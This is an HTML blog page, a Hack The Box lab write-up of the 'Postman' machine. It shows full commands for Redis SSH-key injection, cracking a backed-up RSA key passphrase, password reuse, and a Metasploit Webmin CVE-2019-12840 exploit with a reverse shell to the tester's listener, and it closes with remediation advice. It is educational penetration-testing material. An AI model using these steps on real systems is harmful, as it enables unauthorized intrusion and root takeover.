@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
+  <title>┌──(1kb2㉿onekbtwo)-[~/blog/postman]</title>
+  <link rel="stylesheet" href="../style.css">
+  <link rel="alternate" type="application/rss+xml" title="1kb2" href="../feed.xml">
+  <link rel="icon" href="../favicon.svg" type="image/svg+xml">
+  <link rel="icon" href="../favicon-32.png" sizes="32x32" type="image/png">
+  <link rel="apple-touch-icon" href="../apple-touch-icon.png">
+  <meta name="theme-color" content="#000000">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="HTB CPTS Track: Postman (easy)">
+  <meta property="og:description" content="Black-box Linux box: an unauthenticated Redis instance lets me write my own SSH key for a foothold, a backed-up encrypted private key cracks to a reused password for user, and Webmin 1.910 (CVE-2019-12840) running as root gives up a root shell.">
+  <meta property="og:url" content="https://1kb2.xyz/blog/postman.html">
+  <meta property="og:image" content="https://1kb2.xyz/images/brand/graf-og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="HTB CPTS Track: Postman (easy)">
+  <meta name="twitter:description" content="Black-box Linux box: an unauthenticated Redis instance lets me write my own SSH key for a foothold, a backed-up encrypted private key cracks to a reused password for user, and Webmin 1.910 (CVE-2019-12840) running as root gives up a root shell.">
+  <meta name="twitter:image" content="https://1kb2.xyz/images/brand/graf-og.png">
+  <script>document.documentElement.className = "js";</script>
+  <script src="../js/graf.js" defer></script>
+  <script src="../js/post.js" defer></script>
+</head>
+<body data-graf="perch">
+  <nav class="nav">
+    <a href="../index.html">home</a>
+    <a href="../timeline.html">timeline</a>
+    <a href="../blog/index.html">blog</a>
+    <a href="../feed.xml">rss</a>
+  </nav>
+
+  <main class="markdown-body">
+    <h1>HTB CPTS Track: Postman (easy)</h1>
+    <p class="post-meta">2026-10-02 &middot; <a class="post-cat" href="index.html#cat-writeups">writeups</a></p>
+    <p class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/linux.html" data-tag="linux">#linux</a><a class="tag" href="tag/redis.html" data-tag="redis">#redis</a><a class="tag" href="tag/ssh-key-injection.html" data-tag="ssh-key-injection">#ssh-key-injection</a><a class="tag" href="tag/password-cracking.html" data-tag="password-cracking">#password-cracking</a><a class="tag" href="tag/password-reuse.html" data-tag="password-reuse">#password-reuse</a><a class="tag" href="tag/webmin.html" data-tag="webmin">#webmin</a><a class="tag" href="tag/cve-2019-12840.html" data-tag="cve-2019-12840">#cve-2019-12840</a><a class="tag" href="tag/metasploit.html" data-tag="metasploit">#metasploit</a><a class="tag" href="tag/privilege-escalation.html" data-tag="privilege-escalation">#privilege-escalation</a></p>
+    <p class="post-abstract">Black-box Linux box: an unauthenticated Redis instance lets me write my own SSH key for a foothold, a backed-up encrypted private key cracks to a reused password for user, and Webmin 1.910 (CVE-2019-12840) running as root gives up a root shell.</p>
+    <details class="toc-box" open>
+      <summary>contents</summary>
+<div class="toc">
+<ul>
+<li><a href="#enumeration">Enumeration</a><ul>
+<li><a href="#nmap">Nmap</a></li>
+</ul>
+</li>
+<li><a href="#initial-foothold-unauthenticated-redis">Initial Foothold: Unauthenticated Redis</a></li>
+<li><a href="#recon-finding-the-backup-key">Recon: Finding the Backup Key</a></li>
+<li><a href="#user-crack-the-passphrase-reuse-it">User: Crack the Passphrase, Reuse It</a></li>
+<li><a href="#root-webmin-1910-cve-2019-12840">Root: Webmin 1.910 (CVE-2019-12840)</a></li>
+<li><a href="#remediation">Remediation</a></li>
+</ul>
+</div>
+    </details>
+<p><img alt="" src="../images/Postman1.png" /></p>
+<p>Postman is a black-box Linux box, no credentials to start. It's rated easy, but the chain is a clean tour of four separate mistakes stacked on top of each other: a Redis instance exposed with no auth, a private key backed up where the wrong user can read it, a passphrase reused as a login password, and an outdated Webmin running as root. Each one is small. Together they walk you from an open port to <code>root.txt</code>.</p>
+<ol>
+<li>Unauthenticated <strong>Redis 4.0.9</strong> on 6379, abuse <code>config set dir</code>/<code>dbfilename</code> to write my public key into the <code>redis</code> user's <code>authorized_keys</code>, then SSH in.</li>
+<li>Find <strong><code>/opt/id_rsa.bak</code></strong>, an encrypted RSA private key that <code>redis</code> can read.</li>
+<li>Crack the passphrase offline with <strong>ssh2john + john</strong> (<code>computer2008</code>), which doubles as <strong>Matt's password</strong>, and become Matt for user.</li>
+<li>Matt's creds log into <strong>Webmin 1.910</strong> on port 10000, vulnerable to <strong>CVE-2019-12840</strong>. The module runs as root, so that's root.</li>
+</ol>
+<blockquote>
+<p>No assumed-breach creds here. Everything starts from the Nmap scan.</p>
+</blockquote>
+<hr />
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="link to this section">&para;</a></h2>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="link to this section">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.129.2.1<span class="w"> </span>-T5
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: The Cyber Geek's Personal Website
+6379/tcp  open  redis   Redis key-value store 4.0.9
+10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div>
+
+<p>Four ports, and the two that matter aren't the web server. Port 80 is a personal website (not the way in here), and SSH is just SSH. The leads are:</p>
+<ul>
+<li><strong>Redis 4.0.9 on 6379.</strong> A key-value store reachable straight off the network is loud. Redis in this era ships with no authentication, and it can be talked into writing files. That's the foothold.</li>
+<li><strong>MiniServ 1.910 (Webmin) on 10000.</strong> Webmin 1.910 is old and has a known authenticated RCE. I can't use it yet (no creds), but I note it now, it's the root path.</li>
+</ul>
+<hr />
+<h2 id="initial-foothold-unauthenticated-redis">Initial Foothold: Unauthenticated Redis<a class="headerlink" href="#initial-foothold-unauthenticated-redis" title="link to this section">&para;</a></h2>
+<blockquote>
+<p><strong>Why this works:</strong> Redis before 6.0 has no authentication on by default, and it will tell you where to write its own database file. <code>config set dir</code> picks the directory and <code>config set dbfilename</code> picks the filename of the next <code>save</code>, and that saved RDB file contains whatever keys you've set. Point <code>dir</code> at a user's <code>.ssh/</code>, name the file <code>authorized_keys</code>, store your public key as a value, and <code>save</code> drops your key exactly where <code>sshd</code> looks for it. The blank lines around the key matter: Redis wraps the value in binary RDB metadata, and padding with <code>\n\n</code> keeps your key isolated on its own clean line so SSH still parses it.</p>
+</blockquote>
+<p>Following the Redis key-injection path from <a href="https://hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html">HackTricks</a>, I generate a throwaway keypair and pad the public key with newlines:</p>
+<div class="codehilite"><pre><span></span><code>ssh-keygen<span class="w"> </span>-t<span class="w"> </span>rsa<span class="w"> </span>-f<span class="w"> </span>redis_key<span class="w"> </span>-N<span class="w"> </span><span class="s2">""</span>
+<span class="o">(</span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"\n\n"</span><span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>redis_key.pub<span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"\n\n"</span><span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>spaced_key.txt
+</code></pre></div>
+
+<p>Then load the padded key into Redis, repoint the database at the <code>redis</code> user's <code>.ssh/</code>, name it <code>authorized_keys</code>, and <code>save</code> to flush it to disk:</p>
+<div class="codehilite"><pre><span></span><code>redis-cli<span class="w"> </span>-h<span class="w"> </span><span class="m">10</span>.129.2.1<span class="w"> </span>-x<span class="w"> </span><span class="nb">set</span><span class="w"> </span>crackit<span class="w"> </span>&lt;<span class="w"> </span>spaced_key.txt
+redis-cli<span class="w"> </span>-h<span class="w"> </span><span class="m">10</span>.129.2.1<span class="w"> </span>config<span class="w"> </span><span class="nb">set</span><span class="w"> </span>dir<span class="w"> </span>/var/lib/redis/.ssh
+redis-cli<span class="w"> </span>-h<span class="w"> </span><span class="m">10</span>.129.2.1<span class="w"> </span>config<span class="w"> </span><span class="nb">set</span><span class="w"> </span>dbfilename<span class="w"> </span><span class="s2">"authorized_keys"</span>
+redis-cli<span class="w"> </span>-h<span class="w"> </span><span class="m">10</span>.129.2.1<span class="w"> </span>save
+</code></pre></div>
+
+<p>Every command comes back <code>OK</code>, which means <code>/var/lib/redis/.ssh/authorized_keys</code> now contains my public key. SSH in as <code>redis</code> with the matching private key:</p>
+<div class="codehilite"><pre><span></span><code>ssh<span class="w"> </span>-i<span class="w"> </span>redis_key<span class="w"> </span>redis@10.129.2.1
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>Last login: Fri Oct  2 21:11:47 2026 from 10.10.14.137
+redis@Postman:~$ whoami
+redis
+</code></pre></div>
+
+<p>Shell as <code>redis</code> on <code>Postman</code>.</p>
+<hr />
+<h2 id="recon-finding-the-backup-key">Recon: Finding the Backup Key<a class="headerlink" href="#recon-finding-the-backup-key" title="link to this section">&para;</a></h2>
+<p>First, who else is on the box. Trimming <code>/etc/passwd</code> to the accounts with real shells:</p>
+<div class="codehilite"><pre><span></span><code>root:x:0:0:root:/root:/bin/bash
+...
+Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
+redis:x:107:114::/var/lib/redis:/bin/bash
+</code></pre></div>
+
+<p><code>Matt</code> (uid 1000) is the human user and the obvious next target. Poking around, <code>/opt</code> has something that shouldn't be there:</p>
+<div class="codehilite"><pre><span></span><code>redis@Postman:/opt$<span class="w"> </span>cat<span class="w"> </span>id_rsa.bak
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
+
+JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
+... (trimmed) ...
+X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
+-----END RSA PRIVATE KEY-----
+</code></pre></div>
+
+<p><code>Proc-Type: 4,ENCRYPTED</code> is the detail. This is a private key, readable by <code>redis</code>, but it's locked behind a passphrase, so I can't use it as-is. A backup key (<code>id_rsa.bak</code>) sitting in <code>/opt</code> is the mistake. Now I just need the passphrase.</p>
+<hr />
+<h2 id="user-crack-the-passphrase-reuse-it">User: Crack the Passphrase, Reuse It<a class="headerlink" href="#user-crack-the-passphrase-reuse-it" title="link to this section">&para;</a></h2>
+<p>I pulled the key down to my box (saved it as <code>id</code>) and let John work on it offline:</p>
+<div class="codehilite"><pre><span></span><code>ssh2john<span class="w"> </span>id<span class="w"> </span>&gt;<span class="w"> </span>rsa
+john<span class="w"> </span>rsa<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
+Cost 2 (iteration count) is 2 for all loaded hashes
+computer2008     (id)
+1g 0:00:00:28 DONE (2026-10-02 22:34) ...
+</code></pre></div>
+
+<p>Passphrase: <strong><code>computer2008</code></strong>.</p>
+<blockquote>
+<p><strong>Why this works:</strong> an encrypted SSH private key carries its own verifier, so John can test passphrases against it entirely offline, no network, no lockout, as fast as the CPU goes. <code>ssh2john</code> just reshapes the key into a hash format John understands. A passphrase is then only as strong as its absence from the wordlist, and <code>computer2008</code> is sitting in rockyou.</p>
+</blockquote>
+<p>Here's where the box rewards you for one crack twice. <code>computer2008</code> isn't only the key's passphrase, it's also Matt's account password (the same value logs into Webmin as Matt in the next section), so becoming Matt is a straight <code>su</code> with the password I just recovered. My notes pick back up at Matt's shell with the flag in his home:</p>
+<div class="codehilite"><pre><span></span><code>Matt@Postman:~$ ls
+user.txt
+Matt@Postman:~$ cat user.txt
+&lt;FLAG&gt;
+</code></pre></div>
+
+<p><strong>user.txt captured.</strong></p>
+<blockquote>
+<p><strong>Why this works (password reuse):</strong> there was no technical reason for a backup key's passphrase to match a system login, but people reuse secrets across boundaries all the time. Any secret you crack is worth trying everywhere else before you reach for anything harder, it's often the shortest path to the next account.</p>
+</blockquote>
+<hr />
+<h2 id="root-webmin-1910-cve-2019-12840">Root: Webmin 1.910 (CVE-2019-12840)<a class="headerlink" href="#root-webmin-1910-cve-2019-12840" title="link to this section">&para;</a></h2>
+<p>Matt can reach the Webmin panel on port 10000, and Webmin's whole reason for existing is running system tasks with high privilege. Before trusting that, I check what the service actually runs as:</p>
+<div class="codehilite"><pre><span></span><code>Matt@Postman:~$ ps aux | grep mini
+root        768  0.0  3.1  95296 29268 ?        Ss   20:44   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
+</code></pre></div>
+
+<p><code>miniserv.pl</code> runs as <strong>root</strong>. So any authenticated command execution in Webmin isn't a privesc, it's root directly. Webmin 1.910 has exactly that: <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12840">CVE-2019-12840</a>, an authenticated command injection in the Package Updates module, with a ready Metasploit module.</p>
+<blockquote>
+<p><strong>Why this works:</strong> the Package Updates module builds a shell command out of user-supplied input without sanitizing it, so any authenticated user who can reach that module gets command execution. Because <code>miniserv.pl</code> runs as root, that execution is as root. Matt's reused password is the only authorization the exploit needs.</p>
+</blockquote>
+<p>Find and load the module:</p>
+<div class="codehilite"><pre><span></span><code>msfconsole -q
+msf &gt;&gt; search Webmin 1.910
+
+   #  Name                                     Disclosure Date  Rank       Check  Description
+   -  ----                                     ---------------  ----       -----  -----------
+   0  exploit/linux/http/webmin_packageup_rce  2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
+
+msf &gt;&gt; use 0
+[*] Using configured payload cmd/unix/reverse_perl
+</code></pre></div>
+
+<p>Set Matt's creds, the target, and my listener (<code>RPORT</code> stays 10000):</p>
+<div class="codehilite"><pre><span></span><code>set USERNAME Matt
+set PASSWORD computer2008
+set RHOSTS 10.129.2.1
+set LHOST tun0
+</code></pre></div>
+
+<p>First run fails, and the error is misleading:</p>
+<div class="codehilite"><pre><span></span><code>msf exploit(webmin_packageup_rce) &gt;&gt; run
+[*] Started reverse TCP handler on 10.10.14.137:4444
+[-] Exploit failed: Errno::ENOTCONN Transport endpoint is not connected - getpeername(2)
+[*] Exploit completed, but no session was created.
+</code></pre></div>
+
+<p>That <code>ENOTCONN</code> reads like a network problem, but it's really the module speaking plaintext HTTP at a TLS port. Webmin on 10000 is HTTPS, and the module defaults to <code>SSL false</code>. Flip it and rerun:</p>
+<div class="codehilite"><pre><span></span><code>msf exploit(webmin_packageup_rce) &gt;&gt; set SSL true
+[!] Changing the SSL option's value may require changing RPORT!
+SSL =&gt; true
+msf exploit(webmin_packageup_rce) &gt;&gt; run
+[*] Started reverse TCP handler on 10.10.14.137:4444
+[+] Session cookie: 187fa1b36c28ab5e048701da5d2eeccd
+[*] Attempting to execute the payload...
+[*] Command shell session 1 opened (10.10.14.137:4444 -&gt; 10.129.2.1:38816) at 2026-10-02 22:48:07 +0200
+
+whoami
+root
+cat /root/root.txt
+&lt;FLAG&gt;
+</code></pre></div>
+
+<p><strong>root.txt captured. Box owned.</strong></p>
+<hr />
+<h2 id="remediation">Remediation<a class="headerlink" href="#remediation" title="link to this section">&para;</a></h2>
+<ul>
+<li><strong>Lock down Redis.</strong> Require authentication (<code>requirepass</code> or ACLs), keep <code>protected-mode</code> on, and bind it to <code>127.0.0.1</code> so it isn't reachable off-host. An unauthenticated Redis that can write files is a foothold waiting to happen.</li>
+<li><strong>Don't back up private keys into readable locations.</strong> <code>id_rsa.bak</code> in <code>/opt</code>, readable by the <code>redis</code> service account, is what bridged Redis to a real user. Keys belong in the owner's <code>~/.ssh</code> with tight permissions, not a world-adjacent backup, and this one should be rotated, it's burned.</li>
+<li><strong>Don't reuse a key passphrase as a password.</strong> <code>computer2008</code> covered the key, the Matt account, and Webmin. Separate secrets would have broken the chain at user.</li>
+<li><strong>Patch Webmin.</strong> 1.910 is vulnerable to CVE-2019-12840. Update it, restrict who can reach port 10000, and limit which users have the Package Updates module, since any of them get root through it.</li>
+</ul>
+<hr />
+<p>References:</p>
+<ul>
+<li><a href="https://hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html">HackTricks, 6379 Redis pentesting</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12840">CVE-2019-12840 (NVD)</a>, Webmin Package Updates RCE</li>
+<li><a href="https://www.pentest.com.tr/exploits/Webmin-1910-Package-Updates-Remote-Command-Execution.html">Webmin 1.910 Package Updates RCE advisory (pentest.com.tr)</a></li>
+</ul>
+  </main>
+  <nav class="related" aria-label="Related posts">
+    <h2 class="related-h">related</h2>
+    <ul class="posts">
+      <li class="post"><a class="post-title" href="trick.html">HTB CPTS Track: Trick (easy)</a><span class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/linux.html" data-tag="linux">#linux</a></span></li>
+      <li class="post"><a class="post-title" href="jeeves.html">HTB CPTS Track: Jeeves (medium)</a><span class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/password-cracking.html" data-tag="password-cracking">#password-cracking</a></span></li>
+      <li class="post"><a class="post-title" href="fluffy.html">HTB CPTS Track: Fluffy (easy)</a><span class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a></span></li>
+    </ul>
+  </nav>
+
+  <footer class="footer">
+    <a href="../index.html">back to top</a>
+  </footer>
+</body>
+</html>
